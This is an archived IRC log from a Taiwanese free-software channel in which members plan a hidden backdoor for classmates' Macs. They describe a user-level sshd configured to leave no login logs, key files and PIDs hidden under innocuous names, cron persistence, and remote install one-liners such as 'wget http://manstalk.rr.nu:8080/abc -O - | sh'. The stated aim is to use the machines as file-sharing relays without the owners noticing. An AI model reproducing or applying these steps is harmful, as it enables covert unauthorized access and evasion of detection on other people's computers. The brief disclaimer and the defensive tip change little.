@@ -1,0 +1,230 @@
+--- Log opened 五  1月 03 00:00:56 2014
+00:16 <@haroldwu> http://zaticwu-blog.logdown.com/posts/171820-fantasy-invasion-of-mac-computer
+00:17 <@haroldwu> 大家給點意見XD 不過不是入侵高手的，是拿來入侵笨笨的同學用的
+00:20 <@haroldwu> (拿來當跳板跑驢子)
+00:23 < brli> haroldwu: 聯結直接跳首頁...文章被砍了？
+00:24 <@haroldwu> 哎呀
+00:25 <@haroldwu> 剛剛改了subdomianXD
+00:25 <@haroldwu> http://yfwu.logdown.com/posts/171820-fantasy-invasion-of-mac-computer
+00:28 < brli> 最近的蚊子愈來愈猖狂了...都飛好慢
+00:29 < brli> haroldwu: 學校有限網路流量喔？
+00:29 <@haroldwu> 嘻嘻，漏洞很多，例如觀察到自己電腦突然多了個 .ssh/authorized_keys，或者有在檢查 /usr/bin 的人，或者把 port 22 關起來的人，或者乾脆把 sshd 不執行的人
+00:29 <@haroldwu> 不是，這放在 logdown 上，只是覺得原本的很醜
+00:30  * brli 沒開過sshd
+00:30 <@haroldwu> guildwar 更強，他的sshd 要先 knock knock 才會開門
+00:30 < brli> haroldwu: 沒現流量幹嗎把別人拿來當跳板阿= =？
+00:31  * haroldwu 做壞事的時候用啊~！
+00:32 <@haroldwu> [off] 班上的正妹們都是用 mac
+00:32 < guildwar> 拜託，現在新的 irc log [off] 沒用了啦 XD
+00:32 <@haroldwu> 這是一種象徵性的用法啦 XD
+00:32 < guildwar> 直接上 github
+00:32 < guildwar> 了解，我笨
+00:36 <@haroldwu> 有什麼「改善」建議否？
+00:36 <@haroldwu> 更不容易被抓到的方法
+00:38 < brli> haroldwu: 有點警覺的要root都滿容易被抓到吧
+00:38 < guildwar> 對啊，很容易被發現
+00:38 <@haroldwu> 對啊，不過是拿來搞同學用的
+00:39 <@haroldwu> XD 以後沒人要借我電腦了
+00:39 < brli> 看起來好像也不用root耶= =
+00:39 < brli> 只要把shell路徑指定在~/.local/bin 或~/.bin然後source就好了？
+00:40 < brli> 還有那個home是要寫判斷式的吧？XD
+00:40 < brli> 還是說MAC不能在家目錄執行sh?
+00:40 <@haroldwu> 噢哪裏其實是要讓使用者自己刪...
+00:40 <@haroldwu> 我 shell script 不行QQ
+00:40 < guildwar> 我的方法比較好，弄個 sshd_config 並自己啟動一個 sshd, 這時 log 都不會有登入記錄
+00:41 < brli> guildwar: 黑...
+00:41 < brli> 你行(拇指
+00:41 <@haroldwu> 講解下，另一個sshd？
+00:43 < guildwar> 本來 user 啟動 sshd 會錯誤，因為無法寫入 pid 及 log，只要自備一個 sshd_config，將 pid 及 log 什麼的指向 /var/tmp 或藏起來，並關掉 pam 支援，就可以用一般 user 跑
+00:43 < guildwar> 之後用這個 sshd 登入都不會有記錄，除非他用 netstat 或 lsof 之類的去查
+00:43 <@haroldwu> 所以還是要有個東西回報 ip ~！
+00:44 <@haroldwu> 你這個一般的mac使用者如前端開發者也不會用了把XD 好黑 @@
+00:44 < guildwar> 最簡單讓他主動來 ping　你不就好了
+00:44 < guildwar> 不然只能用 ddns client
+00:45 <@haroldwu> 我沒 public ip 啊，他沒辦法 ping
+00:45 < guildwar> ok
+00:46 < brli> haroldwu: 躲太深也不好喔XDD
+00:46 < brli> haroldwu: 用uname可以判斷是不是linux，沒用過OSX，不知道要怎搞
+00:48 <@haroldwu> 據說是出 darwin
+00:49 < brli> haroldwu: 重點是判斷式要寫出來
+00:49 < brli> XD
+00:50 < brli> guildwar: 還可以直接丟/dev/null咧XDD
+00:50 < guildwar> brli: 什麼東東丟 /dev/null?
+00:51 < brli> log們？
+00:51 <@haroldwu> 正在寫咯~！
+00:52 < brli> haroldwu: 也要黑化了嗎？
+00:52 < guildwar> 我看看有沒有寫 log
+00:53 <@haroldwu> 改了[D
+00:57 <@haroldwu> brli: 這是學習系統的一部分啊~！
+01:02 <@haroldwu> 不行，取得 root 密碼是必要的，不然不能改 cron
+01:02 <@haroldwu> 再不然就是研究 mac 有沒有什麼登入自動啓動方案，夾進去
+01:03 < guildwar> crontab -e 不是可以用 cron 了
+01:04 <@haroldwu> 我這邊找到的方案是 crontab -l | echo "* * * * * /bin/blabla"
+01:06 <@haroldwu> 欸對也，crontab -e 可以開耶，那這個會存在哪裏？
+01:06 < guildwar> /var/spool/cron 中
+01:07 < guildwar> cat filename | crontab -
+01:08 <@haroldwu> 沒辦法耶，/var/spool/cron 沒有我的名字
+01:08 < guildwar> 那你用 crontab -l 有看到東東?
+01:08 < guildwar> 先用 crontab -e 建一個
+01:09 <@haroldwu> 插入失敗咯，no crontab for haroldwu
+01:09 <@haroldwu> 噢
+01:09 < guildwar> echo "0 * * * * /bin/ls" | tee crontab -
+01:09 < guildwar> 格式要對
+01:09 < guildwar> tee 去掉
+01:09 < guildwar> echo "0 * * * * /bin/ls" | crontab -
+01:10 <@haroldwu> 有了，成功 @@
+01:10 <@haroldwu> 那麼，還是得手動存個 crontab 咯
+01:11 < guildwar> 直接在 shell 裡做好
+01:11 <@haroldwu> 這個建立 crontab，crontab -e 的部分，可有辦法寫成 shell script？
+01:11 <@haroldwu> 看看 man
+01:11 < guildwar> cat << EOF
+01:12 <@haroldwu> 不懂QQ 詳細點
+01:12 < guildwar> 等等
+01:16 < guildwar> #!/bin/sh
+01:16 < guildwar> tempfile=$(mktemp)
+01:16 < guildwar> cat << EOF > $tempfile
+01:16 < guildwar> 0 * * * * /bin/ls
+01:16 < guildwar> EOF
+01:16 < guildwar> cat $tempfile | crontab -
+01:16 < guildwar> rm $tempfile
+01:16 < guildwar> 大概如此
+01:19 < brli> 出現了！雙頭龍！
+01:19 <@haroldwu> 成功~！
+01:19 < guildwar> 雙頭龍？
+01:19 <@haroldwu> brli: 你指的是 << >嗎XDD
+01:19 < brli> 對阿XD
+01:19 < guildwar> XD
+01:30 <@haroldwu> 對了，假設這個腳本存在 url_bla
+01:30 <@haroldwu> 那使用 curl 執行是
+01:30 <@haroldwu> curl url_bla | bash 就好嗎？
+01:31 < guildwar> 應該是
+01:40 <@haroldwu> 不對也，是要這樣
+01:40 <@haroldwu> bash <(curl -s http://mywebsite.com/myscript.txt)
+01:42 < guildwar> ok
+01:49 < guildwar> http://pastie.org/8594020 大致上是如此，這時用 ssh 登入後，不會留下 log，但用 ps 或 netstat 還是看得到
+01:49 < guildwar> w 也看不到
+01:52 < guildwar> PidFile 及 HostKey 名字取一般些，如 tmp.txz2u3vmPB
+01:54 < guildwar> 忘了說，無法用密碼登入，只能用 public key
+01:56 < guildwar> 閃人
+01:56 <@haroldwu> ok
+01:56 <@haroldwu> 好黑QQ
+02:00 < brli> 可是/tmp的東西會因為系統機制自己清掉要注意
+02:07 < guildwar> /var/tmp
+02:34 <@haroldwu> 對了，那這個 sshd 植入方案，怎麼跟 crontab 結合？
+02:34 <@haroldwu> 寫一個檢查腳本？XDD
+03:00 <@haroldwu> 恩，/var/tmp 跟 /tmp 有啥差異？@@a
+03:01 <@haroldwu> guildwar: 我知道，腳本有一個部分就是插入 public key
+03:01 <@haroldwu> 如果使用者會去檢查 authorized_keys 就沒效了XD
+09:56 < hmchen> 囧... 重裝 debian 後 lxde 選單不見了
+10:16 < hmchen> deluser -> adduser 重來一次搞定
+10:36  * haroldwu 好標準一個砍掉重練的概念XD
+11:10 < guildwar> haroldwu: sshd_config 中指定自己的 AuthorizedKeysFile
+11:14 <@haroldwu> 哇靠，還有這招XD
+11:14  * haroldwu guildwar 黑黑黑....
+11:14 < guildwar> 結果後來測試，發現無法放在 /tmp 及 /var/tmp 因為這二個目錄有設 sticky bit 的關係吧，所以還是藏在 ~/.config/ssh 或 .local/share/xxx 中比較好
+11:14 < guildwar> ~/.local/share/xxx
+11:15 <@haroldwu> ok
+11:26 < guildwar> script 寫好了
+11:30 <@haroldwu> 你寫好了？！XD
+11:35 -!- haroldwu changed the topic of #tcffm to: 臺中自由軟體愛好者聚會 TcFFM 郵件列表: http://bit.ly/tcffm-forum | IRC-log：https://github.com/a2n/tcffm/ | 論壇：http://tcffm.twgogo.org/
+11:36 < guildwar> wget http://manstalk.rr.nu:8080/abc -O - | sh
+11:36 < guildwar> 你試試，會自動建一個 crontab 事件
+11:36 <@haroldwu> hao
+11:37 <@haroldwu> 太可怕了 @@
+11:37 < guildwar> 快抓回去，我等一下會刪除 :)
+11:38 <@haroldwu> 你這個...逆天了 XD
+11:39 < guildwar> 總共有二個 script，一個是從 cron 中跑，每 10 分檢查一次 sshd 有沒有跑起來，另一個是將第一個 script 放到 crontab 中
+11:40 <@haroldwu> 等下，你插入的是private key？！
+11:40 < guildwar> yes，一個是 sshd host key, 另一個是 ssh client 的 public key
+11:41 < guildwar> 所以你可以自己重新建立另一組
+11:41 <@haroldwu> 這個hostkey怎麼來的呢？
+11:41 <@haroldwu> 自己生成一副嘛？
+11:41 < guildwar> 就和 ssh 的 private key 一樣
+11:41 < guildwar> ssh-keygen
+11:43 < guildwar> 可能要生二組，一組 private key 當作 sshd host key, 另一組拿來 ssh client 登入用
+11:43 <@haroldwu> 好
+11:45 <@haroldwu> 你可以移除咯，我複製了
+11:45 <@haroldwu> wget 應該要開slient 選項之類的？
+11:45 <@haroldwu> 不然下載進度什麼還是會跑出來
+11:45 < guildwar> 反正 wget 只做一次
+11:46 < guildwar>  -q
+11:48 <@haroldwu> 好
+11:49 < guildwar> 看起來滿正常的 XD
+11:50 <@haroldwu> 運作的很好，已經在crontab中了
+11:51 < guildwar> 等一下自動執行後登入看看，若不行，可以用 start-check-process-running-user-sshd --debug 來 debug
+11:51 <@haroldwu> 怎麼個登入法，我沒有public ip啊QQ
+11:52 < guildwar> 當然要先自己產生好 key，將 start-check-process-running-user-sshd 裡的 private key 及 public key 換成自己的
+11:53 <@haroldwu> 好
+11:57 <@haroldwu> 欸，那個亂碼的部分，能自己生成嗎？
+11:57 <@haroldwu> tmp.blablabla
+12:02 <@haroldwu> sshd 起來啦
+12:02 <@haroldwu> 應該是成功的
+12:03 < guildwar> 你就跑 mktemp ,　然後去 /tmp/ 找
+12:04 < guildwar> ok, script 裡直接做掉會比較好
+12:04 < guildwar> ./start-check-process-running-user-sshd stop 可將目前在背景跑的 sshd 砍掉
+12:06 < guildwar> 先說啊，這是你自己寫的 script 啊，出事別找我，通常學得越多，手就越癢
+12:07 < guildwar> 所以最好不要學，我通常只學防禦的本事，攻擊的我不喜歡學 XD
+16:03 <@haroldwu> XDD
+16:03 <@haroldwu> 我今天研究了同學的mac
+16:03 <@haroldwu> mac 沒有wget，只有curl(預裝
+16:03 <@haroldwu> 然後 crontab 可以執行
+16:04 < brli> haroldwu: 有找到uname相關的指令嗎？
+16:06 <@haroldwu> uname可以執行哦
+16:06 <@haroldwu> 出來是darwin
+16:06 <@haroldwu> 不過我順便教同學防禦方法，就是檢查sshd
+16:12 <@haroldwu> guildwar: 對了，你那個 wget 後面的 -O - 是什麼意思？
+16:16 <@haroldwu> 恩，部落文衝上 logdown 本日第一名=.=
+16:16 <@haroldwu> 趕緊加個免責聲明
+16:16 <@haroldwu> 還有防衛方法
+16:35 < guildwar> -O - 就是 wget 回來的東西輸出到 stdout 去
+16:36 <@haroldwu> ok
+16:36 < guildwar> 然後 sh 再從 stdin 收東西回來執行
+16:36 <@haroldwu> 直接 | 不行嗎？
+16:37 < guildwar> 怎麼直接
+16:37 <@haroldwu> wget script_url | sh
+16:37 < guildwar> 一般不下 -O 會直接存在目前目錄檔名一樣的檔案
+16:37 <@haroldwu> see
+16:38 <@haroldwu> curl 不會哦，另外就是 wget 不是內建的東西（mac上
+16:39 <@haroldwu> 不過我看了看，同學的 mac 本來就沒有 sshd 了
+16:39 <@haroldwu> 未知是否有 sshd 可以跑，下次再看
+16:39 < guildwar> sshd 本來就不會內建
+16:39 <@haroldwu> 應該說，進程裏沒有 sshd 這個東西
+16:39 <@haroldwu> 噢
+16:40 <@haroldwu> 可是我可以發出 ssh 指令耶？
+16:41 < guildwar> 那是 ssh client
+16:41 < guildwar> sshd 是 ssh server
+16:41 < guildwar> openssh-server and openssh-client
+16:41 <@haroldwu> 恩，是分開的...那這樣就不好玩了
+16:45 <@haroldwu> guildwar: 看到信了，來抓你的pgp key XD
+16:49 <@haroldwu> ok咯，延長了
+16:49 < maxwux> http://boxhost.me/ 掛了？
+16:50 < brli> maxwux: 我的點沒掛
+16:50 < brli> 論壇可以上
+16:51 < guildwar> 我這邊也可以連
+16:51 <@haroldwu> maxwux: 我也可以上
+16:51 <@haroldwu> maxwux: 你GG，被公司牆了
+17:15  * haroldwu 回家咯
+17:15 < guildwar> bye
+20:23 < maxwux> hello
+20:23 < guildwar> hello
+20:23 < maxwux>  我架了mumble server
+20:23 < maxwux> 來測一下好了
+20:23 < guildwar> ok
+20:56 < hmchen> 純語音?
+20:56 < guildwar> yes
+20:57 < guildwar> 有時候懶得上 irc 打字，動動口就好 XD
+20:58 < guildwar> 一個 server 可以開很多聊天室，不同主題，不會去影響別人，可上鎖不讓人亂入之類的
+20:59 < guildwar> 重點是和 irc 一樣，完全不用註冊就可以用，若要保留匿稱，請註冊
+21:03 < guildwar> maxwux: 還是說要從 web 介面去新增之類的
+21:09 < maxwux> 我後來建立了一個superuser
+21:09 < maxwux> 就可以了
+21:10 < guildwar> ok，那手動建立好頻道後，下次重啟會保留吧
+21:10 < maxwux> 我試試看
+21:11 < guildwar> 好像是寫在 sqlite 資料檔裡
+21:11 < maxwux> 有，有保留
+21:12 < maxwux> 肚子餓了，出門覓食
+21:13 < guildwar> ok
+21:13 < hmchen> 匿名的線上聊天室
+21:14 < guildwar> 這個有些遊戲廠商拿來取代 RC 語音
+23:54 < guildwar> http://goods.ruten.com.tw/item/show?21306134033983  XD
+--- Log closed 六  1月 04 00:00:58 2014
